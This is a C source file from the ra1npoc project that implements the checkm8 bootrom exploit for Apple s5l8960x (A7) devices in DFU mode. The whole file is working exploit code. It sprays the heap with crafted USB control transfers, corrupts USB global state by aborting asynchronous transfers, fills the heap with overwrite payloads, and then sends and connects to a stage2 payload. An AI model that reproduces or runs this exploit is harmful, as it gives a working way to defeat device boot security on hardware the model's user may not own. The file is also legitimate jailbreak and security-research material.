/*
 * ra1npoc - s5l8960x.c
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/common.h>

static unsigned char blank[2048];

unsigned char yolo[] = {
    0x79, 0x6f, 0x6c, 0x6f
};

static void heap_spray(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUGLOG("[%s] (1/4) %x", __FUNCTION__, result.ret);
    usleep(100000);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
    DEBUGLOG("[%s] (2/4) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
#ifdef IPHONEOS_ARM
    for(int i=0;i<7938;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
#else
    async_transfer_t transfer;
    memset(&transfer, '\0', sizeof(async_transfer_t));
    
    // I think this will reduce stability. But it is definitely fast. (for macOS)
    // It doesn't make sense on iPhoneOS.
    int usleep_time = 100;
    for(int i=0; i<7938; i++){
        result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, 64, &transfer);
        usleep(usleep_time);
        io_abort_pipe_zero(client);
        usleep(usleep_time);
        while(transfer.ret != kIOReturnAborted){
            CFRunLoopRun();
        }
    }
#endif
    
    DEBUGLOG("[%s] (3/4) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
    DEBUGLOG("[%s] (4/4) %x", __FUNCTION__, result.ret);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 1408; // t8010 & t8015 & s5l8960x
    
    /* val haxx
     * If async_transfer() sent = 0x40, then val = 1408. And, it is possible to try again a few times and wait until sent = 0x40
     * However, even if sent != 0x40, it succeeds by subtracting the value from val.
     * To reduce the number of attempts, It decided to use subtraction unless sent is greater than val.
     */
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
        i++;
        DEBUGLOG("[%s] (*) retry: %x\n", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*) %x\n", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    heap_spray(client);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    for(int i=0;i<3;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        DEBUGLOG("[%s] (%d/7) %x", __FUNCTION__, 1+(i+1), result.ret);
    }
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    DEBUGLOG("[%s] (5/7) %x", __FUNCTION__, result.ret);
    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, yolo, 4, 100);
    DEBUGLOG("[%s] (6/7) %x", __FUNCTION__, result.ret);
    result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    DEBUGLOG("[%s] (7/7) %x", __FUNCTION__, result.ret);
    
    //r = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
}

int checkra1n_s5l8960x(io_client_t client, checkra1n_payload_t payload)
{
    int r;
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }

    LOG("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client, payload);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] sending stage2 payload", __FUNCTION__);
    r = payload_stage2(client, payload);
    if(r != 0){
        return -1;
    }
    
    r = connect_to_stage2(client, payload);
    if(r != 0){
        return -1;
    }
    
    return 0;
}
